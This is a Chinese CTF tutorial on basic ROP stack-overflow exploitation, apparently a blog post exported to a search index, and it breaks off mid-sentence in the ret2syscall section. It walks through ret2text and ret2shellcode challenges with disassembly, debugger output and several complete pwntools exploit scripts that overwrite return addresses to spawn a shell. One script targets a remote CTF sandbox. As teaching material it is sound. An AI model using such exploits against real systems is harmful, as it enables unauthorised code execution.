<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Stack Overflow - 基本ROP</title>
      <link href="/article/6f59.html"/>
      <url>/article/6f59.html</url>
      
        <content type="html"><![CDATA[<h1 id="Stack-Overflow-基本ROP"><a href="#Stack-Overflow-基本ROP" class="headerlink" title="Stack Overflow - 基本ROP"></a>Stack Overflow - 基本ROP</h1><h2 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h2><ul><li>NX保护（DEP）：栈上的数据没有执行权限，防止栈溢出和在栈上执行shellcode，实际上有了NX保护，堆、栈、bss段就没有执行权限了</li><li>canary保护（FS）：函数开始时会随机产生一个值，这个值canary放在紧挨EBP的位置，当攻击者想要通过缓冲区溢出覆盖EBP和EBP下面的返回地址时，就会覆盖canary的值，程序结束以后，程序会检查canary这个值和之前的是不是一致，不一致就不往下运行，能够防止所有单纯的栈溢出</li><li>RELRO保护（ASLR）：堆栈地址随机化，能够防止所有需要用到堆栈精确地址的攻击</li><li>PIE：代码地址随机化，防止构造ROP链攻击</li></ul><h2 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h2><p>由于NX保护的开启，直接向堆或者是栈上注入代码的方式难以继续发挥效果，可以通过ROP来绕过保护，在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong>gadgets就是以ret结尾的指令序列，通过这些指令序列能够修改某些地址的内容，方便控制程序的执行流程，核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序</p><p>只要满足以下条件，那么就可以尝试进行ROP攻击：</p><ul><li>程序存在栈溢出，并且可以控制返回地址</li><li>可以找到满足条件的gadgets和相应的地址</li></ul><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>即控制程序本身已有的代码(.text)，我们需要知道对应代码的返回位置，如果有保护开启的话，需要想办法绕过</p><h3 id="示例复现"><a href="#示例复现" class="headerlink" title="示例复现"></a>示例复现</h3><p>题目来源：ctfhub</p><p>先检查保护：64位，未开启任何保护</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>使用IDA看源码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">112</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to CTFHub ret2text.Input someting:&quot;</span>);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;bye&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出程序在主函数中使用了 gets 函数，显然存在栈溢出漏洞</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000400795 89 45 FC                      mov     [rbp+var_4], eax</span><br><span class="line">.text:0000000000400798 48 8D 45 F8                   lea     rax, [rbp+var_8]</span><br><span class="line">.text:000000000040079C 48 89 C6                      mov     rsi, rax</span><br><span class="line">.text:000000000040079F 48 8D 3D 22 01 00 00          lea     rdi, unk_4008C8</span><br><span class="line">.text:00000000004007A6 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:00000000004007AB E8 C0 FE FF FF                call    ___isoc99_scanf</span><br><span class="line">.text:00000000004007AB</span><br><span class="line">.text:00000000004007B0 8B 45 F8                      mov     eax, [rbp+var_8]</span><br><span class="line">.text:00000000004007B3 39 45 FC                      cmp     [rbp+var_4], eax</span><br><span class="line">.text:00000000004007B6 75 0C                         jnz     short loc_4007C4</span><br><span class="line">.text:00000000004007B6</span><br><span class="line">.text:00000000004007B8 48 8D 3D 0C 01 00 00          lea     rdi, command                    ; &quot;/bin/sh&quot;</span><br><span class="line">.text:00000000004007BF E8 5C FE FF FF                call    _system</span><br></pre></td></tr></table></figure><p>在 secure 函数又发现了存在调用 system(“&#x2F;bin&#x2F;sh”) 的代码，那么如果我们直接控制程序返回至 0x4007B8，那么就可以得到系统的 shell 了</p><p>接下来就要构造payload了，首先需要确定的是我们能够控制的内存的起始地址距离 main 函数的返回地址的字节数</p><p>第一种办法，直接在IDA里面查看</p><p>点进v4里面，s就是ebp，r就是返回地址，v4就是var_70，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-0000000000000070 ; D/A/*   : change type (data/ascii/array)</span><br><span class="line">-0000000000000070 ; N       : rename</span><br><span class="line">-0000000000000070 ; U       : undefine</span><br><span class="line">-0000000000000070 ; Use data definition commands to create local variables and function arguments.</span><br><span class="line">-0000000000000070 ; Two special fields &quot; r&quot; and &quot; s&quot; represent return address and saved registers.</span><br><span class="line">-0000000000000070 ; Frame size: 70; Saved regs: 8; Purge: 0</span><br><span class="line">-0000000000000070 ;</span><br><span class="line">-0000000000000070</span><br><span class="line">-0000000000000070 var_70 db 112 dup(?)</span><br><span class="line">+0000000000000000  s db 8 dup(?)</span><br><span class="line">+0000000000000008  r db 8 dup(?)</span><br><span class="line">+0000000000000010</span><br><span class="line">+0000000000000010 ; end of stack variables</span><br></pre></td></tr></table></figure><p>第二种办法：</p><p>IDA中找到get函数地址后，在GDB中查看反汇编</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb-peda$ disass 0x400823</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x00000000004007c7 &lt;+0&gt;:push   rbp</span><br><span class="line">   0x00000000004007c8 &lt;+1&gt;:mov    rbp,rsp</span><br><span class="line">=&gt; 0x00000000004007cb &lt;+4&gt;:sub    rsp,0x70</span><br><span class="line">   0x00000000004007cf &lt;+8&gt;:mov    rax,QWORD PTR [rip+0x20089a]        # 0x601070 &lt;stdout@@GLIBC_2.2.5&gt;</span><br><span class="line">   0x00000000004007d6 &lt;+15&gt;:mov    ecx,0x0</span><br><span class="line">   0x00000000004007db &lt;+20&gt;:mov    edx,0x2</span><br><span class="line">   0x00000000004007e0 &lt;+25&gt;:mov    esi,0x0</span><br><span class="line">   0x00000000004007e5 &lt;+30&gt;:mov    rdi,rax</span><br><span class="line">   0x00000000004007e8 &lt;+33&gt;:call   0x400660 &lt;setvbuf@plt&gt;</span><br><span class="line">   0x00000000004007ed &lt;+38&gt;:mov    rax,QWORD PTR [rip+0x20088c]        # 0x601080 &lt;stdin@@GLIBC_2.2.5&gt;</span><br><span class="line">   0x00000000004007f4 &lt;+45&gt;:mov    ecx,0x0</span><br><span class="line">   0x00000000004007f9 &lt;+50&gt;:mov    edx,0x1</span><br><span class="line">   0x00000000004007fe &lt;+55&gt;:mov    esi,0x0</span><br><span class="line">   0x0000000000400803 &lt;+60&gt;:mov    rdi,rax</span><br><span class="line">   0x0000000000400806 &lt;+63&gt;:call   0x400660 &lt;setvbuf@plt&gt;</span><br><span class="line">   0x000000000040080b &lt;+68&gt;:lea    rdi,[rip+0xc6]        # 0x4008d8</span><br><span class="line">   0x0000000000400812 &lt;+75&gt;:call   0x400610 &lt;puts@plt&gt;</span><br><span class="line">   0x0000000000400817 &lt;+80&gt;:lea    rax,[rbp-0x70]</span><br><span class="line">   0x000000000040081b &lt;+84&gt;:mov    rdi,rax</span><br><span class="line">   0x000000000040081e &lt;+87&gt;:mov    eax,0x0</span><br><span class="line">   0x0000000000400823 &lt;+92&gt;:call   0x400650 &lt;gets@plt&gt;</span><br><span class="line">   0x0000000000400828 &lt;+97&gt;:lea    rdi,[rip+0xd4]        # 0x400903</span><br><span class="line">   0x000000000040082f &lt;+104&gt;:call   0x400610 &lt;puts@plt&gt;</span><br><span class="line">   0x0000000000400834 &lt;+109&gt;:mov    eax,0x0</span><br><span class="line">   0x0000000000400839 &lt;+114&gt;:leave  </span><br><span class="line">   0x000000000040083a &lt;+115&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>查看变量的位置，为 <code>[rbp-0x70]</code>。由于是64位系统，要覆盖掉ebp，就要+8字节。因此 字符串长度为 <code>0x70 + 8</code></p><p>写脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="comment"># p = remote()</span></span><br><span class="line"><span class="comment">#远程交互</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#运行这个程序并获得和这个程序进行交互的接口</span></span><br><span class="line">secure = <span class="number">0x4007B8</span></span><br><span class="line"><span class="comment">#/bin/sh地址</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x78</span>  + p64(secure)</span><br><span class="line"><span class="comment">#填满缓冲区，并把返回地址修改成secure的地址</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Welcome to CTFHub ret2text.Input someting:\n&quot;</span>)</span><br><span class="line"><span class="comment">#让程序运行到“Welcome to CTFHub ret2text.Input someting:\n”这句话停下来</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#发送攻击数据</span></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#通过shell进行交互</span></span><br></pre></td></tr></table></figure><h3 id="题目练习"><a href="#题目练习" class="headerlink" title="题目练习"></a>题目练习</h3><p><strong>题目来源：ctfhub</strong></p><ul><li>首先检查保护措施：</li></ul><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312211843520.png" alt="image-20230513191804823"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:    amd64-64-little //文件为32位程序</span><br><span class="line"></span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line"></span><br><span class="line">Stack:    No canary found    //未开启canary保护</span><br><span class="line"></span><br><span class="line">NX:      NX disabled    //未开启栈不可执行保护</span><br><span class="line"></span><br><span class="line">PIE:      No PIE (0x8048000)    //未开启地址无关可执行</span><br><span class="line"></span><br><span class="line">RWX:      Has RWX segments     </span><br></pre></td></tr></table></figure><ol><li><p>首先是stack保护措施，如果开启的话在栈中返回地址前放一个随机值，如果被覆盖，程序就会报错退出</p></li><li><p>nx则是 no execution，如果开启的话就不能让ip寄存器指向堆和栈，注意堆和栈是不同的东西</p></li><li><p>64-bit dynamically linked，获得基本信息之后就运行程序，分析它的功能</p></li></ol><ul><li>IDA查看</li></ul><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312211843527.png" alt="image-20230513195452347"></p><p>看到gets函数，gets函数对输入内容的长度没有限制，可能会存在栈溢出</p><ul><li>点进v4里面，s就是ebp，r就是返回地址，v4就是var_70，所以大小为78，我们希望的就是拿到shell</li></ul><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312211843533.png" alt="image-20230513202925299"></p><ul><li>通过找字符串或者secure函数可以看到&#x2F;bin&#x2F;sh，利用它就可以拿到shell</li></ul><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312211843541.png" alt="image-20230513192105293"></p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312211843543.png" alt="image-20230513192129730"></p><p>找到&#x2F;bin&#x2F;sh的地址（注意要是.text中的地址）</p><ul><li>可以用pwntools写脚本</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="comment"># p = remote()</span></span><br><span class="line"><span class="comment">#远程交互</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#运行这个程序并获得和这个程序进行交互的接口</span></span><br><span class="line">secure = <span class="number">0x4007B8</span></span><br><span class="line"><span class="comment">#/bin/sh地址</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x78</span>  + p32(secure)</span><br><span class="line"><span class="comment">#填满缓冲区，并把返回地址修改成secure的地址</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Welcome to CTFHub ret2text.Input someting:\n&quot;</span>)</span><br><span class="line"><span class="comment">#知道“”这句话停下来</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#发送攻击数据</span></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#通过shell进行交互</span></span><br></pre></td></tr></table></figure><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>控制程序执行shellcode代码，shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell</p><p><strong>一般来说，shellcode 需要我们自己填充，这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码</strong></p><p>想要执行shellcode需要shellcode所在的区域具有可执行权限，即必须是在堆栈不可执行关闭（NX关闭）的情况下才可以</p><h3 id="示例复现-1"><a href="#示例复现-1" class="headerlink" title="示例复现"></a>示例复现</h3><p>题目来源：ctf_wiki</p><p>下载好题目先check</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>32位且无任何保护开启</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No system for you this time !!!&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, s, <span class="number">100u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bye bye ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>IDA分析，无system函数，gets函数存在栈溢出漏洞，进入buf2查看可知其位于bss段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0804A080 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+buf2 db 64h dup(?)                      ; DATA XREF: main+7B↑o</span><br><span class="line">.bss:0804A080 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+_bss ends</span><br></pre></td></tr></table></figure><blockquote><p>.bss段通常是用来存放程序中未初始化的或者初始化为0的全局变量和静态变量的一块内存区域。</p><p>特点是可读写，在程序执行之前.bss会自动清0</p></blockquote><p>通过gdb查看这个bss段是否可执行，b main设置断点，r执行，vmmap查看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb-peda$ vmmap</span><br><span class="line">Start      End        PermName</span><br><span class="line">0x08048000 0x08049000 r-xp/home/giantbranch/Desktop/CTF/ret2shellcode</span><br><span class="line">0x08049000 0x0804a000 r-xp/home/giantbranch/Desktop/CTF/ret2shellcode</span><br><span class="line">0x0804a000 0x0804b000 rwxp/home/giantbranch/Desktop/CTF/ret2shellcode</span><br><span class="line">0xf7e03000 0xf7e04000 rwxpmapped</span><br><span class="line">0xf7e04000 0xf7fb4000 r-xp/lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fb4000 0xf7fb5000 ---p/lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fb5000 0xf7fb7000 r-xp/lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fb7000 0xf7fb8000 rwxp/lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fb8000 0xf7fbb000 rwxpmapped</span><br><span class="line">0xf7fd3000 0xf7fd4000 rwxpmapped</span><br><span class="line">0xf7fd4000 0xf7fd7000 r--p[vvar]</span><br><span class="line">0xf7fd7000 0xf7fd9000 r-xp[vdso]</span><br><span class="line">0xf7fd9000 0xf7ffc000 r-xp/lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">0xf7ffc000 0xf7ffd000 r-xp/lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">0xf7ffd000 0xf7ffe000 rwxp/lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">0xfffdd000 0xffffe000 rwxp[stack]</span><br></pre></td></tr></table></figure><p>通过vmmap可以看到对应的bss段具有可执行权限</p><p>那么就可以考虑让程序跳转到shellcode中，通过栈溢出把shellcode赋给buf2，执行bss段的shellcode</p><p>第一种办法</p><p>IDA中能够看到：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0804858C 8D 44 24 1C                   lea     eax, [esp+80h+s]</span><br><span class="line">.text:08048590 89 04 24                      mov     [esp], eax                      ; s</span><br><span class="line">.text:08048593 E8 38 FE FF FF                call    _gets</span><br></pre></td></tr></table></figure><p>get函数的地址为0x08048593</p><p>在gdb中查看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb-peda$ disass 0x08048593</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x0804852d &lt;+0&gt;:push   ebp</span><br><span class="line">   0x0804852e &lt;+1&gt;:mov    ebp,esp</span><br><span class="line">   0x08048530 &lt;+3&gt;:and    esp,0xfffffff0</span><br><span class="line">   0x08048533 &lt;+6&gt;:add    esp,0xffffff80</span><br><span class="line">   0x08048536 &lt;+9&gt;:mov    eax,ds:0x804a060</span><br><span class="line">   0x0804853b &lt;+14&gt;:mov    DWORD PTR [esp+0xc],0x0</span><br><span class="line">   0x08048543 &lt;+22&gt;:mov    DWORD PTR [esp+0x8],0x2</span><br><span class="line">   0x0804854b &lt;+30&gt;:mov    DWORD PTR [esp+0x4],0x0</span><br><span class="line">   0x08048553 &lt;+38&gt;:mov    DWORD PTR [esp],eax</span><br><span class="line">   0x08048556 &lt;+41&gt;:call   0x8048410 &lt;setvbuf@plt&gt;</span><br><span class="line">   0x0804855b &lt;+46&gt;:mov    eax,ds:0x804a040</span><br><span class="line">   0x08048560 &lt;+51&gt;:mov    DWORD PTR [esp+0xc],0x0</span><br><span class="line">   0x08048568 &lt;+59&gt;:mov    DWORD PTR [esp+0x8],0x1</span><br><span class="line">   0x08048570 &lt;+67&gt;:mov    DWORD PTR [esp+0x4],0x0</span><br><span class="line">   0x08048578 &lt;+75&gt;:mov    DWORD PTR [esp],eax</span><br><span class="line">   0x0804857b &lt;+78&gt;:call   0x8048410 &lt;setvbuf@plt&gt;</span><br><span class="line">   0x08048580 &lt;+83&gt;:mov    DWORD PTR [esp],0x8048660</span><br><span class="line">   0x08048587 &lt;+90&gt;:call   0x80483e0 &lt;puts@plt&gt;</span><br><span class="line">   0x0804858c &lt;+95&gt;:lea    eax,[esp+0x1c]</span><br><span class="line">   0x08048590 &lt;+99&gt;:mov    DWORD PTR [esp],eax</span><br><span class="line">=&gt; 0x08048593 &lt;+102&gt;:call   0x80483d0 &lt;gets@plt&gt;</span><br><span class="line">   0x08048598 &lt;+107&gt;:mov    DWORD PTR [esp+0x8],0x64</span><br><span class="line">   0x080485a0 &lt;+115&gt;:lea    eax,[esp+0x1c]</span><br><span class="line">   0x080485a4 &lt;+119&gt;:mov    DWORD PTR [esp+0x4],eax</span><br><span class="line">   0x080485a8 &lt;+123&gt;:mov    DWORD PTR [esp],0x804a080</span><br><span class="line">   0x080485af &lt;+130&gt;:call   0x8048420 &lt;strncpy@plt&gt;</span><br><span class="line">   0x080485b4 &lt;+135&gt;:mov    DWORD PTR [esp],0x8048680</span><br><span class="line">   0x080485bb &lt;+142&gt;:call   0x80483c0 &lt;printf@plt&gt;</span><br><span class="line">   0x080485c0 &lt;+147&gt;:mov    eax,0x0</span><br><span class="line">   0x080485c5 &lt;+152&gt;:leave  </span><br><span class="line">   0x080485c6 &lt;+153&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>s相对于esp的索引为<code>esp + 0x1c</code></p><p>断点下在0x08048593，r运行，查看esp和ebp</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EBP  0xffffd018 ◂— 0x0</span><br><span class="line">ESP  0xffffcf90 —▸ 0xffffcfac —▸ 0x80482d0 ◂— pop    edi</span><br></pre></td></tr></table></figure><p>esp为<code>0xffffCF90</code>，ebp为<code>0xffffd018</code>，那么s的地址为<code>0xffffcfac</code>，s相对于ebp的偏移为<code>6c</code>，s相对于返回地址偏移<code>0x6c + 4</code></p><p>第二种办法，类似于ret2text直接找</p><p>第三种办法</p><p>利用GDB调试，<code>cyclic 200</code>生成200个字符的字符串，r运行，输入生成的字符串，显示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Invalid address 0x62616164</span><br></pre></td></tr></table></figure><p>程序报错，说明我们输入的字符覆盖了eip，即字符“daab”</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EAX  0x0</span><br><span class="line">EBX  0x0</span><br><span class="line">ECX  0xffffffff</span><br><span class="line">EDX  0xf7fb8870 (_IO_stdfile_1_lock) ◂— 0x0</span><br><span class="line">EDI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line">ESI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line">EBP  0x62616163 (&#x27;caab&#x27;)</span><br><span class="line">ESP  0xffffd020 ◂— 0x62616165 (&#x27;eaab&#x27;)</span><br><span class="line">EIP  0x62616164 (&#x27;daab&#x27;)</span><br></pre></td></tr></table></figure><p><code>cyclic -l 0x62616164</code>或<code>cyclic -l daab</code>计算字符串偏移量可得112</p><p>exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#生成一个执行 /bin/sh 的机器码</span></span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line"></span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">&#x27;A&#x27;</span>) + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="题目练习-1"><a href="#题目练习-1" class="headerlink" title="题目练习"></a>题目练习</h3><p><strong>题目来源：ctfhub</strong></p><ul><li><p>首先检查保护措施</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>保护全关</p><p>运行能看到会生成一个地址，放到IDA里面</p></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  buf[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  buf[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to CTFHub ret2shellcode!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What is it : [%p] ?\n&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input someting : &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">1024uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这道题没有自带的system函数，保护没开，可以使用ret2shellcode</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-0000000000000010 buf dq ?</span><br><span class="line">-0000000000000008 var_8 dq ?</span><br><span class="line">+0000000000000000  s db 8 dup(?)</span><br><span class="line">+0000000000000008  r db 8 dup(?)</span><br></pre></td></tr></table></figure><p>​printf可以直接输出buf的地址，<code>__int64 buf[2]; // [rsp+0h] [rbp-10h] BYREF</code>可以得出，buf相对于rbp的偏移为：<code>0x10</code>，加上返回地址<code>0x08</code>（64位），所以buf的大小为<code>0x10 + 0x08</code>。所以可用的空间为24字节（0x18），虽然有23字节的shellcode，但是因为其本身有push指令，如果把shellcode放到返回地址之前，那么在程序返回时会破坏shellcode，所以将shellcode放到函数的return地址之后（call main指令的下一条地址，执行完main函数后，会ret并从栈中pop出给RIP），所以将其覆盖为shellcode的地址就可以获得shell</p><ul><li>由上面的分析可知，假设填充的大小padding为<code>0x18</code>，假设buf的地址为buf_addr，那么加32<code>(0x10 + 0x08 +0x08)</code>就可以跳过填充数据和返回地址，shellcode使用pwntools生成的</li></ul><p>​借一下大佬的图，很直观<a href="https://blog.csdn.net/m0_43405474/article/details/126546838">CTFhub-pwn-[ret2shellcode]_ctfhub ret2shellcode_沧海一粟日尽其用的博客-CSDN博客</a></p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312211843545.png" alt="image-20230626094949977"></p><ul><li>EXP</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">host=<span class="string">&#x27;challenge-df513d1e25503d2f.sandbox.ctfhub.com&#x27;</span></span><br><span class="line">port=<span class="number">29219</span></span><br><span class="line">io=connect(host,port)</span><br><span class="line"><span class="comment">#io=process(&#x27;./ret2shellcode&#x27;)</span></span><br><span class="line">padding=<span class="number">0x18</span></span><br><span class="line"><span class="comment">#Get the addr of buf</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">buf_addr=io.recvuntil(<span class="string">&#x27;]&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Input someting :&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;buf_addr:&#x27;</span>,buf_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode=&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line">payload=flat([<span class="string">&#x27;a&#x27;</span>*padding,p64(<span class="built_in">int</span>(buf_addr,<span class="number">16</span>)+<span class="number">32</span>),asm(shellcraft.sh())])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;payload:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><h4 id="gadgets"><a href="#gadgets" class="headerlink" title="gadgets"></a>gadgets</h4><p>ret 结尾的指令序列，通过这些指令序列可以修改某些地址的内容，方便控制程序的执行流程</p><p>比如：<code>pop eax ; ret</code></p><p>这两个指令的作用就是将栈顶的数据pop给eax，然后将栈顶的数据作为返回地址返回，如果通过栈溢出把eip覆盖为pop eax的地址，程序返回时就会执行pop eax </p><h4 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h4><ul><li><p>Linux 的系统调用通过 int 80h 实现，用系统调用号来区分入口函数</p></li><li><p>应用程序调用系统调用的过程是：</p><ul><li>把系统调用的编号存入EAX</li><li>把函数参数存入其他寄存器</li><li>触发0x80号中断（int 